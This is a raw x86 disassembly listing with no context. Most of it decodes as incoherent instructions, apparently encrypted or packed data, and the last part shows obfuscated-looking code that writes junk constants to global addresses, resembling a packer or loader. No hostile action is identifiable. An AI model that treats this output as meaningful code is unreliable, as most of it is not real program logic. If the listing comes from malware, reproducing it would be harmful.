  40aaf7:	ins    BYTE PTR es:[edi],dx
  40aaf8:	(bad)
  40aafc:	cmp    al,0x48
  40aafe:	push   ebx
  40aaff:	push   eax
  40ab00:	adc    BYTE PTR [esi-0x6b],0x45
  40ab04:	das    
  40ab05:	ins    BYTE PTR es:[edi],dx
  40ab06:	stc    
  40ab07:	mov    edi,0x62cbd2
  40ab0c:	xchg   esi,eax
  40ab0d:	and    BYTE PTR [ecx-0x1],0xdb
  40ab11:	in     eax,dx
  40ab12:	jbe    0x40ab65
  40ab14:	shl    DWORD PTR [edx+ebx*1],1
  40ab17:	or     esi,esp
  40ab19:	or     esi,DWORD PTR [ecx+0x433110be]
  40ab1f:	retf   0xdba1
  40ab22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab23:	int3   
  40ab24:	or     al,BYTE PTR [ecx-0xf6858fe]
  40ab2a:	xchg   ecx,eax
  40ab2b:	iret   
  40ab2c:	or     eax,esp
  40ab2e:	in     al,0x3
  40ab30:	push   edi
  40ab31:	iret   
  40ab32:	pop    edi
  40ab33:	jae    0x40ab79
  40ab35:	in     al,dx
  40ab36:	xchg   edi,eax
  40ab37:	mov    ch,0xd
  40ab39:	cmp    eax,esp
  40ab3b:	outs   dx,BYTE PTR ds:[esi]
  40ab3c:	in     al,dx
  40ab3d:	sbb    DWORD PTR [esi-0x7244d02c],esi
  40ab43:	and    eax,0xf3a6cd3a
  40ab48:	(bad)  
  40ab4a:	inc    edx
  40ab4b:	lds    edx,FWORD PTR [ecx-0x4a]
  40ab4e:	cmp    DWORD PTR [esp+eiz*8],esp
  40ab51:	call   0x8584e559
  40ab56:	mov    WORD PTR [edx+ebx*8+0x45],fs
  40ab5a:	sub    al,0xef
  40ab5c:	icebp  
  40ab5d:	inc    edx
  40ab5e:	lods   al,BYTE PTR ds:[esi]
  40ab5f:	aas    
  40ab60:	and    eax,0x3f546af6
  40ab65:	jmp    0x272d:0xff08e67f
  40ab6c:	mov    ecx,0xdfb5374b
  40ab71:	loope  0x40ab88
  40ab73:	loop   0x40aaf9
  40ab75:	inc    esp
  40ab76:	lahf   
  40ab77:	dec    ebp
  40ab78:	cmp    eax,0x31330403
  40ab7d:	xchg   esi,eax
  40ab7e:	stos   BYTE PTR es:[edi],al
  40ab7f:	pushf  
  40ab80:	dec    esi
  40ab81:	xchg   ecx,eax
  40ab82:	je     0x40ab4a
  40ab84:	sub    ah,BYTE PTR [ebp+0x3d]
  40ab87:	sub    ecx,DWORD PTR [edx+0x7c]
  40ab8a:	sbb    BYTE PTR [ebx],bh
  40ab8c:	sbb    ecx,DWORD PTR [edx]
  40ab8e:	jnp    0x40ab76
  40ab90:	mov    edx,DWORD PTR [ecx]
  40ab92:	imul   edx,DWORD PTR [ebx],0xffffffff
  40ab95:	xor    dl,bl
  40ab97:	push   edx
  40ab98:	fs cld 
  40ab9a:	push   ss
  40ab9b:	jp     0x40ab96
  40ab9d:	inc    ebx
  40ab9e:	cmp    al,0x5d
  40aba0:	xor    DWORD PTR [edx+0x3b],ecx
  40aba3:	xor    al,0x41
  40aba5:	push   edi
  40aba6:	jg     0x40abad
  40aba8:	cmp    eax,0x2512bbdc
  40abad:	pop    esi
  40abae:	pop    ebx
  40abaf:	pop    eax
  40abb0:	dec    esi
  40abb1:	arpl   dx,sp
  40abb3:	jo     0x40abf5
  40abb5:	(bad)  
  40abb6:	cmp    eax,0xe61614ab
  40abbb:	aas    
  40abbc:	stc    
  40abbd:	push   esi
  40abbe:	out    dx,eax
  40abbf:	add    edi,esp
  40abc1:	loop   0x40ac3d
  40abc3:	ds cwde 
  40abc5:	xchg   DWORD PTR [esi+0x7dcbb4ca],ecx
  40abcb:	inc    edi
  40abcc:	jno    0x40ac28
  40abce:	jb     0x40ab88
  40abd0:	add    BYTE PTR [ebp-0x44],ah
  40abd3:	fdiv   st(4),st
  40abd5:	jecxz  0x40ac50
  40abd7:	cmp    DWORD PTR [ebp+0x61],ebp
  40abda:	pop    edi
  40abdb:	test   DWORD PTR [ecx+eiz*8],esp
  40abde:	jnp    0x40abf5
  40abe0:	out    0x93,al
  40abe2:	fisub  DWORD PTR [esi+0x42]
  40abe5:	cmp    ch,bh
  40abe7:	js     0x40ac02
  40abe9:	stos   DWORD PTR es:[edi],eax
  40abea:	sahf   
  40abeb:	cmp    esi,edx
  40abed:	retf   0xe9ba
  40abf0:	add    DWORD PTR [esi-0x4e26c719],edx
  40abf6:	sbb    DWORD PTR [edi-0x4],ecx
  40abf9:	sbb    ebx,DWORD PTR [ebp-0x19]
  40abfc:	fild   QWORD PTR [edx]
  40abfe:	xor    eax,0x895e7da2
  40ac03:	ins    DWORD PTR es:[edi],dx
  40ac04:	cmp    BYTE PTR cs:[ebx+ebx*1+0x2a38d27],cl
  40ac0c:	mov    al,ds:0x62b17232
  40ac11:	xchg   edi,eax
  40ac12:	adc    bl,bl
  40ac14:	push   es
  40ac15:	call   0x4f6f1aec
  40ac1a:	push   cs
  40ac1b:	daa    
  40ac1c:	mov    edx,0x78344724
  40ac21:	leave  
  40ac22:	retf   0x2c95
  40ac25:	shl    DWORD PTR [ebx+edx*4],0x57
  40ac29:	or     bl,ah
  40ac2b:	mov    edi,0x8409b00
  40ac30:	fadd   DWORD PTR ds:0x56068c5e
  40ac36:	xchg   esp,eax
  40ac37:	pushf  
  40ac38:	fld    TBYTE PTR [edi]
  40ac3a:	cmp    eax,0xc7bf3c25
  40ac3f:	dec    ebp
  40ac40:	jno    0x40abe1
  40ac42:	jb     0x40ac96
  40ac44:	int    0x75
  40ac46:	push   ebp
  40ac47:	sbb    eax,0x85eff553
  40ac4c:	mov    dl,0xc
  40ac4e:	dec    edx
  40ac4f:	mov    esi,0x8840cbc9
  40ac54:	and    BYTE PTR ds:0x1ba2262f,bh
  40ac5a:	cwde   
  40ac5b:	arpl   WORD PTR [ebx],cx
  40ac5d:	dec    edx
  40ac5e:	pop    edi
  40ac5f:	push   edi
  40ac60:	push   es
  40ac61:	lock jmp DWORD PTR [edi-0x21]
  40ac65:	hlt    
  40ac66:	pusha  
  40ac67:	sbb    DWORD PTR [ecx],ecx
  40ac69:	mov    bl,BYTE PTR [esi+0x3f43fedb]
  40ac6f:	add    DWORD PTR [eax+edx*2-0x1766ed98],esp
  40ac76:	push   esp
  40ac77:	or     DWORD PTR [eax],esi
  40ac79:	mov    ebp,0x6259f4eb
  40ac7e:	in     eax,dx
  40ac7f:	jb     0x40ac85
  40ac81:	iret   
  40ac82:	fidivr DWORD PTR [ebp-0x5e]
  40ac85:	ja     0x40acd8
  40ac87:	jbe    0x40ace9
  40ac89:	outs   dx,DWORD PTR ds:[esi]
  40ac8a:	dec    esi
  40ac8b:	sub    cl,BYTE PTR [esi+esi*2-0x79]
  40ac8f:	push   esi
  40ac90:	inc    ebx
  40ac91:	dec    ebx
  40ac92:	mov    cl,0xa6
  40ac94:	(bad)  
  40ac95:	or     BYTE PTR [esi],ch
  40ac97:	(bad)  
  40ac98:	mov    bl,0x89
  40ac9a:	pop    ebp
  40ac9b:	ins    DWORD PTR es:[edi],dx
  40ac9c:	dec    ebx
  40ac9d:	imul   esp,DWORD PTR [esi-0x49],0x70dc5c55
  40aca4:	(bad)  
  40aca5:	ds cwde 
  40aca7:	out    dx,al
  40aca8:	inc    esi
  40aca9:	pushf  
  40acaa:	adc    eax,0x1d89d5d
  40acaf:	imul   ecx,DWORD PTR [edx],0x8733a4a6
  40acb5:	pop    ecx
  40acb6:	ficomp WORD PTR [esi-0x11]
  40acb9:	adc    BYTE PTR [edi-0x45b379ff],bh
  40acbf:	data16 mov dh,0x4d
  40acc2:	xor    esp,DWORD PTR [esi-0x71]
  40acc5:	xor    eax,0x88129332
  40acca:	cld    
  40accb:	and    eax,0x40ff1435
  40acd0:	out    dx,eax
  40acd1:	not    DWORD PTR [edi-0xb9de48c]
  40acd7:	arpl   WORD PTR [edx],di
  40acd9:	das    
  40acda:	into   
  40acdb:	clc    
  40acdc:	add    eax,0xbb9ca74e
  40ace1:	push   ds
  40ace2:	and    DWORD PTR [esi+ebx*8],edx
  40ace5:	cdq    
  40ace6:	fstp   st(7)
  40ace8:	sbb    ch,BYTE PTR [edi-0xb5bea9e]
  40acee:	add    al,0x23
  40acf0:	inc    esi
  40acf1:	cmp    eax,0xd7d28234
  40acf6:	out    0x81,al
  40acf8:	ins    DWORD PTR es:[edi],dx
  40acf9:	lea    ecx,[esi-0x1b0be5de]
  40acff:	call   0xdcf951ae
  40ad04:	ret    
  40ad05:	xor    eax,0x2b8c5df5
  40ad0a:	jl     0x40acca
  40ad0c:	mov    dl,0x35
  40ad0e:	add    bh,BYTE PTR ds:0x57783283
  40ad14:	add    eax,0xc879a4f7
  40ad19:	jle    0x40ad27
  40ad1b:	jo     0x40ad1a
  40ad1d:	jns    0x40ad6e
  40ad1f:	xchg   edx,eax
  40ad20:	ror    ebx,1
  40ad22:	inc    esp
  40ad23:	mov    edi,0x5c9f1fd1
  40ad28:	frstor [ebp+0xf398381]
  40ad2e:	or     bh,dh
  40ad30:	cs sub cl,al
  40ad33:	imul   esi,DWORD PTR [eax-0x2850ca07],0x5
  40ad3a:	imul   esp,ebx,0x35876fd6
  40ad40:	dec    edi
  40ad41:	in     al,0x1
  40ad43:	xchg   DWORD PTR [ebx+0x2a524e34],ecx
  40ad49:	cli    
  40ad4a:	icebp  
  40ad4b:	adc    BYTE PTR [ebx],bh
  40ad4d:	adc    DWORD PTR [ecx+0x61],ebp
  40ad50:	jmp    0xa9d4:0x70f3cb66
  40ad57:	push   ebx
  40ad58:	pop    ebx
  40ad59:	call   0xe874f011
  40ad5e:	pusha  
  40ad5f:	push   esp
  40ad60:	add    BYTE PTR [ebp-0x44f8c9b],dl
  40ad66:	jecxz  0x40ada1
  40ad68:	lods   al,BYTE PTR ds:[esi]
  40ad69:	jne    0x40ad60
  40ad6b:	popa   
  40ad6c:	fsub   DWORD PTR [edi+eiz*1+0x28]
  40ad70:	dec    ecx
  40ad71:	sbb    BYTE PTR [ebx],ch
  40ad73:	jmp    0x36f85c09
  40ad78:	mov    bh,0xdd
  40ad7a:	mov    dl,0x4c
  40ad7c:	stos   DWORD PTR es:[edi],eax
  40ad7d:	(bad)  [esi-0x12]
  40ad80:	mov    ds:0xa06d2805,al
  40ad85:	cdq    
  40ad86:	ja     0x40ad93
  40ad88:	or     ebx,DWORD PTR [edx]
  40ad8a:	gs icebp 
  40ad8c:	sub    al,0xd7
  40ad8e:	mov    bh,0xcf
  40ad90:	neg    DWORD PTR [ebp-0x3e]
  40ad93:	test   eax,0x9d301bfd
  40ad98:	hlt    
  40ad99:	mov    ah,0xee
  40ad9b:	sub    eax,0x6bc7ac1c
  40ada0:	push   ecx
  40ada1:	xchg   ebx,eax
  40ada2:	jae    0x40ad61
  40ada4:	nop
  40ada5:	add    ebp,edi
  40ada7:	into   
  40ada8:	int3   
  40ada9:	idiv   DWORD PTR [ecx+0x3063abe]
  40adaf:	dec    ecx
  40adb0:	aaa    
  40adb1:	inc    ebx
  40adb2:	adc    ebx,ecx
  40adb4:	add    eax,0x6215ef0
  40adb9:	dec    esp
  40adba:	cmp    DWORD PTR [edi-0x7d],0xffffffef
  40adbe:	rcl    BYTE PTR [esi],1
  40adc0:	mov    esi,ebp
  40adc2:	cdq    
  40adc3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40adc5:	or     eax,0xb45cabc8
  40adca:	xchg   esp,eax
  40adcb:	out    0x83,al
  40adcd:	push   ecx
  40adce:	and    DWORD PTR [ecx+0x250cf3d],eax
  40add4:	inc    eax
  40add5:	fistp  QWORD PTR [eax-0x1b]
  40add8:	aaa    
  40add9:	ins    WORD PTR es:[edi],dx
  40addb:	out    dx,eax
  40addc:	sbb    ebp,edx
  40adde:	inc    ebx
  40addf:	lds    esi,FWORD PTR [ecx+esi*4-0x2e]
  40ade3:	push   ecx
  40ade4:	ret    
  40ade5:	fbld   TBYTE PTR [eax+0x68]
  40ade8:	or     BYTE PTR [ebp-0x6f],0xa2
  40adec:	sti    
  40aded:	fsub   DWORD PTR [edx-0x48c2ea7f]
  40adf3:	pop    ebx
  40adf4:	sbb    ebp,ebx
  40adf6:	test   BYTE PTR [ebx],dl
  40adf8:	cwde   
  40adf9:	std    
  40adfa:	int3   
  40adfb:	popf   
  40adfc:	or     DWORD PTR [edi-0x18],ebp
  40adff:	lods   eax,DWORD PTR ds:[esi]
  40ae00:	jmp    0x9354ac5d
  40ae05:	stc    
  40ae06:	call   0x3b266f8e
  40ae0b:	pop    es
  40ae0c:	cmp    eax,0x34b8752e
  40ae11:	inc    ebx
  40ae12:	ins    DWORD PTR es:[edi],dx
  40ae13:	xchg   esp,eax
  40ae14:	dec    esi
  40ae15:	or     DWORD PTR [edi-0xe],ebx
  40ae18:	imul   edx,DWORD PTR ds:0x8d60342e,0xeb235ae3
  40ae22:	jo     0x40ade1
  40ae24:	in     eax,dx
  40ae25:	cli    
  40ae26:	xor    eax,0x98310cd3
  40ae2b:	add    eax,0xc18a278b
  40ae30:	stc    
  40ae31:	cmp    DWORD PTR [edx],edx
  40ae33:	leave  
  40ae34:	push   esi
  40ae35:	int    0x1c
  40ae37:	sbb    al,0xae
  40ae39:	add    DWORD PTR [edi],ebx
  40ae3b:	xchg   cl,dl
  40ae3d:	or     al,BYTE PTR [eax+0x427d5c55]
  40ae43:	add    ah,bl
  40ae45:	mov    al,0x60
  40ae47:	inc    esp
  40ae48:	loopne 0x40ae4d
  40ae4a:	lods   eax,DWORD PTR ds:[esi]
  40ae4b:	jge    0x40ae75
  40ae4d:	aaa    
  40ae4e:	lods   eax,DWORD PTR ds:[esi]
  40ae4f:	das    
  40ae50:	fcom   DWORD PTR ds:0xb42ed6f
  40ae56:	pop    ds
  40ae57:	pusha  
  40ae58:	shl    DWORD PTR [ebp-0x4a6fe474],1
  40ae5e:	and    BYTE PTR [ecx-0x12c8efd],bh
  40ae64:	fsin   
  40ae66:	mov    al,0xf5
  40ae68:	nop
  40ae69:	test   eax,0x5d7003d4
  40ae6e:	pop    ds
  40ae6f:	cmc    
  40ae70:	push   ds
  40ae71:	cs cmp ch,al
  40ae74:	inc    ebx
  40ae75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae76:	call   0x635c:0x57d4034a
  40ae7d:	and    DWORD PTR [ebp+0x5d3af0e2],ebx
  40ae83:	jmp    0x8c77:0x80df78b4
  40ae8a:	cmp    BYTE PTR [edx+0x37],cl
  40ae8d:	jp     0x40ae5d
  40ae8f:	sub    eax,0xacbb1c8f
  40ae94:	push   ecx
  40ae95:	xchg   BYTE PTR fs:[esi+0x50],al
  40ae99:	cmp    eax,0x8f0307de
  40ae9e:	mov    esp,0x153f7805
  40aea3:	pop    esp
  40aea4:	xor    DWORD PTR [eax-0x8200c80],esp
  40aeaa:	das    
  40aeab:	dec    edx
  40aeac:	pushf  
  40aead:	and    cl,BYTE PTR [esi-0x46]
  40aeb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeb1:	cdq    
  40aeb2:	mov    al,ds:0x34261773
  40aeb7:	inc    ebp
  40aeb8:	into   
  40aeb9:	adc    al,0x53
  40aebb:	sbb    eax,0x65e1cbed
  40aec0:	cs cmc 
  40aec2:	xchg   esi,eax
  40aec3:	test   ebp,esi
  40aec5:	push   esp
  40aec6:	xchg   ebx,eax
  40aec7:	mov    ebx,esp
  40aec9:	js     0x40aedf
  40aecb:	and    DWORD PTR [ebx+0x18],ecx
  40aece:	xor    DWORD PTR [edi],0xfffffffc
  40aed1:	stc    
  40aed2:	das    
  40aed3:	jb     0x40ae9c
  40aed5:	jne    0x40aed5
  40aed7:	clc    
  40aed8:	add    eax,0x8d40e06c
  40aedd:	xchg   edi,eax
  40aede:	loope  0x40af0d
  40aee0:	retf   
  40aee1:	ror    DWORD PTR [eax+0x76b71f3e],0x75
  40aee8:	mov    al,ds:0x7d57cdfe
  40aeed:	sahf   
  40aeee:	mov    al,0xb2
  40aef0:	add    BYTE PTR [ebp+ebp*4-0xb],dh
  40aef4:	add    al,0x59
  40aef6:	ins    BYTE PTR es:[edi],dx
  40aef7:	jo     0x40aeb1
  40aef9:	mov    BYTE PTR [ebp-0x132eaeb0],dl
  40aeff:	mov    ah,0xce
  40af01:	mov    dl,0x13
  40af03:	lea    ebp,[esi]
  40af05:	loop   0x40aeb9
  40af07:	loope  0x40aecd
  40af09:	fadd   QWORD PTR [ebx+eiz*4]
  40af0c:	out    dx,al
  40af0d:	sbb    dl,BYTE PTR [edi-0x6d]
  40af10:	rcl    esp,cl
  40af12:	xor    eax,0xcc918203
  40af17:	push   esp
  40af18:	xor    DWORD PTR [eax-0x78c7ef69],edi
  40af1e:	xor    al,0xee
  40af20:	popf   
  40af21:	data16 mov WORD PTR [ebx+0x2607b280],es
  40af28:	inc    ebp
  40af29:	or     bl,BYTE PTR [ebp-0x1a]
  40af2c:	or     al,0xde
  40af2e:	xor    ebp,ebp
  40af30:	out    0xfc,al
  40af32:	out    0xc6,al
  40af34:	or     esp,DWORD PTR [edx]
  40af36:	mov    ds,WORD PTR ss:[esp+ebp*2+0x19]
  40af3b:	push   edi
  40af3c:	lods   eax,DWORD PTR ds:[esi]
  40af3d:	sbb    edi,ecx
  40af3f:	mov    al,0x86
  40af41:	cmp    BYTE PTR [ebx-0x2c9566d3],0xfd
  40af48:	sahf   
  40af49:	adc    ecx,esi
  40af4b:	rcl    DWORD PTR ds:0xffc151cf,cl
  40af51:	inc    ebp
  40af52:	push   ecx
  40af53:	cwde   
  40af54:	in     al,0x2c
  40af56:	sub    al,0x2b
  40af58:	repnz out dx,eax
  40af5a:	lods   al,BYTE PTR ds:[esi]
  40af5b:	inc    eax
  40af5c:	in     eax,dx
  40af5d:	in     al,0x86
  40af5f:	scas   eax,DWORD PTR es:[edi]
  40af60:	adc    esp,DWORD PTR [eax+0x718c5e69]
  40af66:	mov    dl,0x9d
  40af68:	xor    DWORD PTR [edi],0x4a
  40af6b:	xchg   ecx,eax
  40af6c:	mov    cl,0x5f
  40af6e:	test   DWORD PTR [edi-0x2],ebx
  40af71:	add    DWORD PTR [ecx+0x41],edi
  40af74:	sbb    DWORD PTR [edi+0x7dc68937],ebp
  40af7a:	add    BYTE PTR [edx],ch
  40af7c:	daa    
  40af7d:	and    al,0x71
  40af7f:	push   ebp
  40af80:	push   ebp
  40af81:	or     al,0x51
  40af83:	inc    ebp
  40af84:	add    bh,BYTE PTR [edx+0x2bd68e36]
  40af8a:	shr    BYTE PTR [ecx-0x5818d95c],0x82
  40af91:	and    al,0xd5
  40af93:	adc    DWORD PTR [edx+ebx*1-0x7b],eax
  40af97:	pusha  
  40af98:	jge    0x40af9f
  40af9a:	scas   eax,DWORD PTR es:[edi]
  40af9b:	div    ecx
  40af9d:	cmc    
  40af9e:	stc    
  40af9f:	xor    BYTE PTR [edx+0x64],dl
  40afa2:	out    0x53,al
  40afa4:	icebp  
  40afa5:	fcmovnbe st,st(6)
  40afa7:	sti    
  40afa8:	xchg   edi,eax
  40afa9:	jge    0x40afe3
  40afab:	cmp    ebx,DWORD PTR [ebp+0x2699f315]
  40afb1:	out    dx,eax
  40afb2:	jns    0x40af6e
  40afb4:	sti    
  40afb5:	ror    BYTE PTR [eax-0x5f61d0ef],0x51
  40afbc:	adc    DWORD PTR [edx],eax
  40afbe:	dec    edi
  40afbf:	xchg   esp,eax
  40afc0:	pop    esi
  40afc1:	je     0x40b02d
  40afc3:	jns    0x40b026
  40afc5:	adc    BYTE PTR [edx+ecx*4-0x362b0ada],bl
  40afcc:	mov    ebp,0x4c036489
  40afd1:	jns    0x40afeb
  40afd3:	and    BYTE PTR [ebx-0x59],dl
  40afd6:	imul   edx,DWORD PTR [edi],0x54
  40afd9:	cdq    
  40afda:	dec    eax
  40afdb:	mov    cl,0x70
  40afdd:	and    eax,0x518b8831
  40afe2:	pop    ebp
  40afe3:	push   0x829402b7
  40afe8:	popw   ds
  40afea:	push   es
  40afeb:	mov    ah,0x1b
  40afed:	aaa    
  40afee:	mov    cl,0xee
  40aff0:	or     ch,ch
  40aff2:	sti    
  40aff3:	cmp    ebx,ecx
  40aff5:	cli    
  40aff6:	cmp    ah,ah
  40aff8:	mov    al,0xb1
  40affa:	push   ebp
  40affb:	arpl   WORD PTR [edi+eiz*1],cx
  40affe:	sbb    BYTE PTR cs:[eax+0x2e],0x47
  40b003:	add    bh,BYTE PTR [esi+0x4535705f]
  40b009:	sbb    edi,DWORD PTR [eax]
  40b00b:	retf   
  40b00c:	lahf   
  40b00d:	mov    ch,0x19
  40b00f:	les    esi,FWORD PTR [ecx+esi*2-0x47]
  40b013:	sub    DWORD PTR [edx-0x1ee341c1],esi
  40b019:	hlt    
  40b01a:	pop    es
  40b01b:	sbb    BYTE PTR ds:0x6b24bdd0,ch
  40b021:	pop    eax
  40b022:	add    edi,ebx
  40b024:	(bad)  
  40b025:	mul    DWORD PTR [ebx]
  40b027:	ins    BYTE PTR es:[edi],dx
  40b028:	adc    al,0x66
  40b02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02b:	out    0x1e,al
  40b02d:	loop   0x40b034
  40b02f:	jo     0x40afec
  40b031:	popf   
  40b032:	xchg   ecx,eax
  40b033:	add    edi,esi
  40b035:	ret    0x9bc
  40b038:	pop    ss
  40b039:	mov    bh,0x91
  40b03b:	je     0x40b01c
  40b03d:	shl    DWORD PTR [ebx],cl
  40b03f:	dec    edi
  40b040:	mov    DWORD PTR [ebx+0xe],ebp
  40b043:	mov    ch,0xa9
  40b045:	cpuid  
  40b047:	shr    bl,cl
  40b049:	pushf  
  40b04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b04b:	(bad)  [ebx+0x50e5fc9f]
  40b051:	push   ebx
  40b052:	adc    BYTE PTR [esi+0x7b3e2b56],bl
  40b058:	or     eax,0xa58b3325
  40b05d:	mov    edi,0x9e900673
  40b062:	sub    ah,ah
  40b064:	cmp    BYTE PTR ds:0xd29902ff,bl
  40b06a:	adc    BYTE PTR [eax+0x2],dh
  40b06d:	pop    edx
  40b06e:	jno    0x40b045
  40b070:	cmp    BYTE PTR [ebp-0x6c],cl
  40b073:	retf   
  40b074:	out    dx,eax
  40b075:	cwde   
  40b076:	or     BYTE PTR [ebx-0x46497337],dh
  40b07c:	push   esi
  40b07d:	dec    esp
  40b07e:	cmp    ah,BYTE PTR [ebp-0x17]
  40b081:	pop    ebx
  40b082:	adc    eax,0x44aa3905
  40b087:	push   ebx
  40b088:	cs jo  0x40b011
  40b08b:	fsubr  st,st(4)
  40b08d:	xchg   DWORD PTR [esp+edx*2+0x16],edi
  40b091:	les    esi,FWORD PTR [ebp-0x5bba51fd]
  40b097:	cmp    BYTE PTR [edi],dl
  40b099:	xchg   eax,esi
  40b09b:	and    eax,0xdcb5d54e
  40b0a0:	xchg   ebp,eax
  40b0a1:	es inc ebp
  40b0a3:	xor    al,0xfb
  40b0a5:	jae    0x40b0a6
  40b0a7:	dec    edi
  40b0a8:	sar    BYTE PTR [ebx],1
  40b0aa:	xor    dl,BYTE PTR [edi+0x409ab975]
  40b0b0:	and    esp,0x69
  40b0b3:	add    bl,BYTE PTR [edx+ebx*8-0x49]
  40b0b7:	pop    ecx
  40b0b8:	mov    ah,0xca
  40b0ba:	or     al,BYTE PTR [esi+0x6d]
  40b0bd:	(bad)  
  40b0be:	es ss push ds
  40b0c1:	add    al,BYTE PTR [edi]
  40b0c3:	jge    0x40b134
  40b0c5:	xchg   edx,eax
  40b0c6:	sub    eax,DWORD PTR [ebx+0x77a61a3c]
  40b0cc:	sbb    DWORD PTR [eax+0x9],edi
  40b0cf:	jge    0x40b089
  40b0d1:	pushf  
  40b0d2:	xor    bh,dl
  40b0d4:	pushf  
  40b0d5:	cmc    
  40b0d6:	repnz adc DWORD PTR [ecx-0x47c9fd12],ebx
  40b0dd:	scas   eax,DWORD PTR es:[edi]
  40b0de:	cmc    
  40b0df:	push   ss
  40b0e0:	cmp    eax,0x619f1d26
  40b0e5:	push   ebp
  40b0e6:	inc    ebx
  40b0e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e8:	pushf  
  40b0e9:	mov    ebx,0xa2cdc3cb
  40b0ee:	pop    es
  40b0ef:	das    
  40b0f0:	jnp    0x40b0a7
  40b0f2:	mov    dh,0x74
  40b0f4:	mov    bl,BYTE PTR [ebp+0x7c]
  40b0f7:	sub    DWORD PTR [edi+0xe0f432d],edi
  40b0fd:	iret   
  40b0fe:	retf   0x9cf8
  40b101:	scas   eax,DWORD PTR es:[edi]
  40b102:	test   DWORD PTR [ebx+0x3b],eax
  40b105:	test   DWORD PTR [edx],eax
  40b107:	jp     0x40b118
  40b109:	shl    BYTE PTR [ecx+0x7ce10af6],1
  40b10f:	pop    DWORD PTR [edx+0x12]
  40b112:	add    al,0xfb
  40b114:	into   
  40b115:	shr    DWORD PTR [ebx+0x16],0x82
  40b119:	aad    0xc9
  40b11b:	sar    esi,0x40
  40b11e:	retf   
  40b11f:	add    al,0x9c
  40b121:	(bad)  
  40b123:	jl     0x40b15a
  40b125:	and    ch,bh
  40b127:	push   cs
  40b128:	mov    ah,0xd7
  40b12a:	inc    ebp
  40b12b:	pushf  
  40b12c:	ins    DWORD PTR es:[edi],dx
  40b12d:	loopne 0x40b0d7
  40b12f:	int    0xbe
  40b131:	add    BYTE PTR [esi-0x3c],0x13
  40b135:	pop    es
  40b136:	push   cs
  40b137:	ror    DWORD PTR [edi+ebp*8-0x1f6859e7],1
  40b13e:	sub    dh,BYTE PTR [edx+0x524ce058]
  40b144:	sub    al,0x9b
  40b146:	add    al,0x30
  40b148:	mov    dh,0x39
  40b14a:	sti    
  40b14b:	cmp    al,bh
  40b14d:	stc    
  40b14e:	lea    ebx,[edx-0x77]
  40b151:	test   al,0x75
  40b153:	xchg   edi,eax
  40b154:	ret    0xa764
  40b157:	ret    
  40b158:	mov    esi,0xeb53c940
  40b15d:	adc    cl,BYTE PTR [edx-0x13]
  40b160:	xchg   esp,eax
  40b161:	cmc    
  40b162:	jno    0x40b0ea
  40b164:	adc    ebx,esi
  40b166:	push   ecx
  40b167:	lods   al,BYTE PTR ds:[esi]
  40b168:	rcl    ch,1
  40b16a:	ja     0x40b171
  40b16c:	outs   dx,BYTE PTR ds:[esi]
  40b16d:	mov    al,ds:0x1c5d131d
  40b172:	in     al,dx
  40b173:	leave  
  40b174:	xor    eax,0xe0f72155
  40b179:	xor    dl,BYTE PTR [esi]
  40b17b:	psrld  mm4,QWORD PTR [eax+0xf]
  40b17f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b180:	jo     0x40b106
  40b182:	add    ecx,DWORD PTR [eax+0x3519e7bc]
  40b188:	xor    al,0xdd
  40b18a:	xor    BYTE PTR [edi+0x64],0x93
  40b18e:	push   esi
  40b18f:	mov    ds:0x450eb0dd,al
  40b194:	(bad)  
  40b195:	test   eax,0x18458bee
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3dc
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff5e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
